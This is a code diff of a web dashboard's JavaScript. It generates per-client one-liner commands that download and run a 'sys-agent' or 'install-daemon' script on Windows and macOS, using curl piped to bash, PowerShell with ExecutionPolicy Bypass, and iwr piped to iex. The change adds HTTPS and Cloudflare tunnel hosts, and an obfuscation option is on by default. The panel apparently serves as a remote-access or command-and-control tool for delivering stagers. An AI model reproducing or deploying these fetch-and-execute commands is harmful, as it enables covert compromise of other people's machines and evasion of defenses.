@@ -5210,19 +5210,28 @@
                             function updateTerminalCommands() {
                                 const ipEl = document.getElementById('termServerIp');
                                 const portEl = document.getElementById('termServerPort');
-                                const ip = (ipEl && ipEl.value.trim()) ? ipEl.value.trim() : (window.location.hostname || '192.168.1.52');
+                                let rawIp = (ipEl && ipEl.value.trim()) ? ipEl.value.trim() : (window.location.hostname || '192.168.1.52');
                                 const port = (portEl && portEl.value.trim()) ? portEl.value.trim() : (window.location.port || '8000');
-                                const portStr = port ? `:${port}` : '';
+                                
+                                const isHttps = window.location.protocol === 'https:' || rawIp.startsWith('https://') || rawIp.includes('trycloudflare.com');
+                                const scheme = isHttps ? 'https' : 'http';
+                                const cleanIp = rawIp.replace(/^https?:\/\//, '').replace(/\/$/, '');
+                                
+                                let portStr = (port && port !== '80' && port !== '443') ? `:${port}` : '';
+                                if (isHttps && (port === '8000' || !portEl || !portEl.value.trim())) {
+                                    portStr = '';
+                                }
+
                                 const clientId = generateClientId();
 
-                                const rawSelfWin = `curl.exe -s "http://127.0.0.1${portStr}/sys-agent?client_id=${clientId}" -o "$env:TEMP\\sys.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sys.ps1"`;
-                                const rawSelfMac = `curl -sSL "http://127.0.0.1${portStr}/sys-agent-mac?client_id=${clientId}" | bash`;
+                                const rawSelfWin = `curl.exe -s "http://127.0.0.1:${port}/sys-agent?client_id=${clientId}" -o "$env:TEMP\\sys.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sys.ps1"`;
+                                const rawSelfMac = `curl -sSL "http://127.0.0.1:${port}/sys-agent-mac?client_id=${clientId}" | bash`;
 
-                                const rawRemoteWin = `curl.exe -s "http://${ip}${portStr}/sys-agent?client_id=${clientId}" -o "$env:TEMP\\sys.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sys.ps1"`;
-                                const rawRemoteMac = `curl -sSL "http://${ip}${portStr}/sys-agent-mac?client_id=${clientId}" | bash`;
+                                const rawRemoteWin = `curl.exe -s "${scheme}://${cleanIp}${portStr}/sys-agent?client_id=${clientId}" -o "$env:TEMP\\sys.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sys.ps1"`;
+                                const rawRemoteMac = `curl -sSL "${scheme}://${cleanIp}${portStr}/sys-agent-mac?client_id=${clientId}" | bash`;
 
-                                const rawDaemonWin = `powershell -ExecutionPolicy Bypass -Command "iwr -useb http://${ip}${portStr}/api/install-daemon?os=win | iex"`;
-                                const rawDaemonMac = `curl -sSL "http://${ip}${portStr}/api/install-daemon?os=mac" | bash`;
+                                const rawDaemonWin = `powershell -ExecutionPolicy Bypass -Command "iwr -useb ${scheme}://${cleanIp}${portStr}/api/install-daemon?os=win | iex"`;
+                                const rawDaemonMac = `curl -sSL "${scheme}://${cleanIp}${portStr}/api/install-daemon?os=mac" | bash`;
 
                                 const isObfuscated = document.getElementById('chkObfuscateCmds') ? document.getElementById('chkObfuscateCmds').checked : true;
 
